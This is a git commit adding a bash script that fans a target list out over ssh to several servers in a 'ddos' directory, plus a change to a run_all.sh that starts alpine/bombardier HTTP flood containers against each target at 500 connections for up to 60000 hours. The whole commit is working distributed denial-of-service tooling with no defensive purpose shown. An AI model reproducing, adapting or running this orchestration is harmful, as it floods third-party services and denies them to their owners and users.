312ff71d8eb3c4e887f0f47941366e577e57b6f8
Andrew Kobylin <andriy.kobylin@beetroot.com.ua>
2022-03-07 15:26:28 +0200

    add deploy targets

---
+++ deploy_targets.sh
@@ -0,0 +1,21 @@
+#!/usr/bin/env bash
+
+while IFS= read -r line; do
+    echo "Server: $line";
+    server_ip=`echo $line | awk -F ";" '{print $1}'`
+    server_processes=`echo $line | awk -F ";" '{print $2}'`
+
+    scp "${2}" andrew@$server_ip:/home/andrew/ddos/targets.txt
+ssh -T andrew@$server_ip <<_EOF_
+  cd /home/andrew/ddos
+  ./run_all.sh targets.txt $server_processes
+_EOF_
+
+#    echo "Params: $server_ip --- $server_processes"
+
+    echo "Server: $line. Done"
+#    echo "\n";
+#   docker run --platform linux/amd64 -d  alpine/bombardier -c "${2:-500}" -d 60000h -l "$line"
+done < "${1}"
+
+
--- run_all.sh
+++ run_all.sh
@@ -3,5 +3,5 @@
 docker kill `docker ps -q`
 
 while IFS= read -r line; do
-   docker run --platform linux/amd64 -d  alpine/bombardier -c "${2:-500}" -d 60000h -l "$line"
+   docker run --platform linux/amd64 -d  alpine/bombardier -c "${2:-500}" -d "${3:-60000h}" -l "$line"
 done < "${1:-resources.txt}"
